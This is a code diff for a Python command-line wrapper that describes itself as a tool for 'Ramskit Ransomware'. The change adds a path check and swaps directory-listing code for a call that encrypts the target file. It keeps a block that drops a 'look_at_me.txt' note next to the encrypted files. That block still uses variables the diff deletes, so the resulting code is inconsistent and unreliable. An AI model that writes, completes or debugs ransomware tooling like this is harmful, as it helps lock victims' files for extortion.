@@ -27,7 +27,7 @@ import argparse
 def main() -> None:
     parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
     parser.add_argument('-a', '--action', dest="action", required=True,
-                        help='Action to perform [encrypt/decrypt/generate_key]')
+                        help='Action to perform [encrypt/decrypt]')
     parser.add_argument('-p', '--path', dest="path", help='Path to file(s) to encrypt/decrypt')
     args = parser.parse_args()
     
@@ -43,10 +43,13 @@ def main() -> None:
             print(f"[x] The file {encrypted} does not exist. Exiting...")
             sys.exit(1)
 
+        if not encrypted:
+            print("[x] Please provide the path to the file using the -p or --path option. Exiting...")
+            sys.exit(1)
+
         # Implement all this stuff
-        path_encrypted = encrypted
-        items = os.listdir(path_encrypted)
-        full_path_encrypted = [os.path.join(path_encrypted, item) for item in items]
+        ramskit.encrypt_file(encrypted, key)
+        print("[x] File encrypted. Exiting...")
 
         with open(os.path.join(path_encrypted, 'look_at_me.txt'), 'w') as file:
             ramskit.encrypt_file(full_path_encrypted, key)
